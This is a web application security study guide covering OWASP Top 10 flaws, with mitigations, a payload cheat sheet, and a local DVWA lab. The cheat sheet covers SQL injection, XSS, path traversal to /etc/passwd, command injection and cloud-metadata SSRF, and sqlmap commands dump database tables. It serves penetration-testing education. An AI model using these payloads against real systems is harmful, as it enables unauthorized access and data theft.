# Web App Hacking (OWASP Top 10)

> **TL;DR:** Web vulnerabilities stem from trusting user input or failing to enforce authorization on the server. Master **Burp Suite** (Proxy + Repeater + Intruder) alongside manual testing for IDOR, SQLi, XSS, CSRF, SSRF, Path Traversal, and Command Injection.

---

## Core Concepts & Mental Model

### High-Impact Web Vulnerabilities
| Vulnerability | Root Cause | Impact | Mitigation |
|---------------|------------|--------|------------|
| **Broken Access Control (IDOR)** | Changing `/api/user/101` -> `/api/user/102` without server-side ownership check | Read/modify other users' data | Enforce server-side authorization on every object |
| **SQL Injection (SQLi)** | Concatenating user input into SQL queries | Dump DB, bypass auth, sometimes RCE | Parameterized queries / Prepared statements |
| **Cross-Site Scripting (XSS)** | Rendering unsanitized user input in HTML/JS | Steal tokens (if non-HttpOnly), perform actions as victim | Context-aware output encoding + CSP |
| **CSRF** | State-changing request lacks unpredictable anti-CSRF token | Force logged-in user to execute unwanted actions | `SameSite=Lax/Strict` cookies + CSRF tokens |
| **SSRF** | Server fetches a user-supplied URL | Access internal services (`169.254.169.254`, `127.0.0.1`) | Allowlist domains/IPs, block private/metadata ranges |
| **Command Injection** | Passing user input to OS shell (`system()`, `exec()`) | Full server Remote Code Execution (RCE) | Avoid shell calls; pass args as arrays |
| **Path Traversal / LFI** | Unsanitized file path (`../../../../etc/passwd`) | Read sensitive configs, keys, or source code | Canonicalize paths + enforce base directory |

---

## Quick-Reference Payload & Tool Cheatsheet

### 1. Burp Suite Core Workflow
1. **Proxy -> Intercept / HTTP History:** Capture requests; send interesting ones to **Repeater** (`Ctrl+R`).
2. **Repeater:** Modify parameters, headers (`X-Forwarded-For`), or cookies manually and inspect responses.
3. **Intruder:** Fuzz parameters or brute-force IDs/PINs (or use `ffuf` for speed).

### 2. SQLMap & Manual SQLi Snippets
| Tool / Payload | Purpose |
|----------------|---------|
| `' OR 1=1-- -` | Classic auth-bypass / boolean test payload |
| `' UNION SELECT 1,database(),user()-- -` | Test column count and extract DB metadata |
| `sqlmap -u "http://target.com/item?id=1" --batch --dbs` | Automated SQLi detection & database enumeration |
| `sqlmap -r req.txt --batch -D appdb --tables` | Run `sqlmap` from a saved Burp HTTP request file (`req.txt`) |
| `sqlmap -r req.txt --batch -D appdb -T users --dump` | Dump table contents |

### 3. Manual Test Payloads (XSS, LFI, Command Injection)
| Category | Quick Probe Payload |
|----------|---------------------|
| **XSS** | `<script>alert(document.domain)</script>` / `<img src=x onerror=alert(1)>` |
| **LFI / Path Traversal** | `../../../../etc/passwd` or `....//....//etc/passwd` |
| **Command Injection** | `; id` / `\| whoami` / `$(sleep 5)` (blind time-based check) |
| **SSRF** | `http://127.0.0.1:80` / `http://169.254.169.254/latest/meta-data/` |

---

## Common Pitfalls & Defensive Notes
- **Relying Only on Automated Scanners:** `sqlmap` and scanners miss logic flaws like **IDOR**, race conditions, and multi-step business logic bugs. Always test authorization manually in Burp Repeater.
- **Defensive Tip:** Deploy parameterized queries everywhere, enforce strict server-side RBAC/ownership checks, and monitor WAF/access logs for encoded traversal (`%2e%2e%2f`) and SQL keywords (`UNION SELECT`).

---

## Hands-On Lab: Testing SQLi & XSS Against DVWA / Juice Shop on Kali

**Goal:** Launch a local vulnerable web app (DVWA) bound to `127.0.0.1`, intercept a request with `curl`/Burp, and run `sqlmap` step-by-step.

### Step 1: Launch Local Vulnerable Target (DVWA)
```bash
docker run -d --name dvwa-lab -p 127.0.0.1:8080:80 vulnerables/web-dvwa
```
Open `http://127.0.0.1:8080` in Firefox -> click **Create / Reset Database** -> log in with `admin` / `password` -> set **DVWA Security** to **Low**.

### Step 2: Manual SQL Injection Probe
Navigate to **SQL Injection** in DVWA and test User ID `1` vs `1' OR '1'='1`:
- `1` returns 1 user.
- `1' OR '1'='1` returns **all users** in the table—proving user input altered the SQL logic!

### Step 3: Automate Enumeration with `sqlmap`
Grab your `PHPSESSID` cookie from Browser DevTools (or Burp HTTP History), then run:
```bash
# 1. Enumerate databases
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION_ID>; security=low" \
  --batch --dbs

# 2. List tables inside 'dvwa' database
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION_ID>; security=low" \
  -D dvwa --tables --batch
```

### Step 4: Clean Up
```bash
docker stop dvwa-lab && docker rm dvwa-lab
```

---

## Practice & Next Steps
- **Labs:** [PortSwigger Web Security Academy](https://portswigger.net/web-security) (Start with SQLi, XSS, Access Control, SSRF), OWASP Juice Shop
- **Next Topic:** [Exploitation & Shells](exploitation_and_shells.md)
